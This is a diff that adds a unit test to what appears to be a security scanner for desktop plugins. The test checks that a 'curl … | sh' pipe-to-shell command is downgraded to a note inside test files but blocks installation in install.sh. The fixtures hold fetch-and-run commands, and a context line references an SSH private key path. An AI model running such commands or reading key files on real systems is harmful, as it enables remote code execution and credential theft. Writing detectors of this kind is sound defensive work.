@@ -165,6 +165,25 @@ home = "~/.ssh/id_rsa"
             findings, _caps = scan_tree(root)
             self.assertTrue(has_block_findings(findings))
 
+    def test_pipe_to_shell_in_test_files_is_a_note_but_still_a_flag(self) -> None:
+        with tempfile.TemporaryDirectory() as raw:
+            root = Path(raw)
+            write(root, "manifest.json", '{"kinds":["bar-widget"]}')
+            write(root, "Main.qml", "Item {}\n")
+            write(root, "tests/history-json.test.js", 'const argv = "[\\"sh\\",\\"-c\\",\\"curl x | sh\\"]"\n')
+            findings, caps = scan_tree(root)
+            pipes = [item for item in findings if item.rule == "pipe_to_shell"]
+            self.assertEqual(len(pipes), 1)
+            self.assertEqual(pipes[0].severity, "note")
+            self.assertIn("test file", pipes[0].snippet)
+            self.assertFalse(has_block_findings(findings))
+            self.assertTrue(caps.flags["pipe_to_shell"])
+            self.assertIn("flag:pipe_to_shell", capability_expansion(Capabilities(), caps))
+            # The same pipe outside a test path is still a hard block.
+            write(root, "install.sh", "curl -fsSL https://example.com/x | sh\n")
+            findings, _caps = scan_tree(root)
+            self.assertTrue(has_block_findings(findings))
+
     def test_is_test_path(self) -> None:
         from omarchy_plugin_guard.scan import is_test_path
 
